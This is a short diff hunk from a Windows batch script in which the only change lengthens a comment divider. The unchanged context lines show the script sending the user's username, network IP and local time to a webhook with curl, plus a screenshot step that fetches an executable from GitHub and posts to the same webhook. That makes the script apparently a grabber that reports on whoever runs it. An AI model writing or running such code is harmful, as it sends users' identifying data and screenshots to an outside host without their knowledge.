@@ -36,7 +36,7 @@ for /f "tokens=1-4 delims=/:." %%a in ("%TIME%") do (
 curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[Report from %USERNAME% - %NetworkIP%]\nLocal time: %HH24%:%MI%```\"}"  %webhook%
 
 :: SCREENSHOT - REMOVE GOTO IF YOU WANT TO TAKE A SCREENSHOT WHEN RUN
-:: ----------
+:: ------------------------------------------------------------------
 goto skipscreenshot
 	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Screenshot @ %HH24%:%MI%```\"}"  %webhook%
 	set "ssurl=https://github.com/chuntaro/screenshot-cmd/blob/master/screenshot.exe?raw=true"
